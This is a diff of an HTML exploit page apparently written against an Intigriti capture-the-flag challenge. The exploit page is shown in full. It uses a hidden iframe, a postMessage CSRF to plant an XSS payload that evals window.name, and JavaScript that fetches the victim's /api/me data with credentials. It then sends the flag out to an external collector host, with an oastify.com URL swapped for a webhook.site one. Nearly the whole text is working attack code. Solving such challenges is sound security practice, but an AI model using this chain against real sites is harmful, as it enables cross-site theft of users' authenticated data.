@@ -6,7 +6,7 @@
 <body>
     <iframe 
         id="frame" 
-        name="fetch('/api/me', {credentials: 'include'}).then(r=>r.json()).then(d=>{ navigator.sendBeacon('http://t60cu91colpt3lv8btizc8fuslycm8ax.oastify.com?flag='+encodeURIComponent(d.flag)) })"
+        name="fetch('/api/me', {credentials: 'include'}).then(r=>r.json()).then(d=>{ navigator.sendBeacon('https://webhook.site/5c699d9b-1a2c-4d4c-a79a-d3f7b3fac905?flag='+encodeURIComponent(d.flag)) })"
         src="https://challenge-0126.intigriti.io/checkout.html" 
         style="opacity:0;width:0;height:0">
     </iframe>
@@ -15,26 +15,30 @@
         const TARGET = "https://challenge-0126.intigriti.io";
         const frame = document.getElementById('frame');
 
-        // Tiny injection: Breaks the title attribute and evals window.name
+        // Tiny Injection: Breaks out of title="" attribute in marketwatch.html
+        // and executes the code stored in window.name.
         const tiny_xss = `"><svg/onload=eval(name)>`;
 
+        // Wait for checkout.html to load
         frame.onload = () => {
             setTimeout(() => {
-                // 1. CSRF: Force the bot to create the malicious transaction
+                // STEP 1: CSRF via postMessage
+                // Force the bot to submit a transaction with our malicious payload as the address
                 frame.contentWindow.postMessage({
                     type: 'submitTransaction',
                     transaction: {
                         toAddress: tiny_xss, 
-                        currency: '1337COIN', // Using the special currency
-                        amount: 1337
+                        currency: 'BTC', // Admin likely holds BTC
+                        amount: 0.00000001
                     }
                 }, '*');
 
-                // 2. Trigger: Redirect the iframe to the page where the transaction (and XSS) is rendered
-                // This ensures window.name persists to the new page
+                // STEP 2: Trigger the XSS
+                // The checkout page might redirect to dashboard, but we force it to marketwatch.html
+                // marketwatch.html renders the transaction list -> executes our payload
                 setTimeout(() => {
                     frame.contentWindow.location = TARGET + '/marketwatch.html';
-                }, 2000); 
+                }, 2000); // Wait 2s for the API to process the transaction
             }, 1000);
         };
     </script>
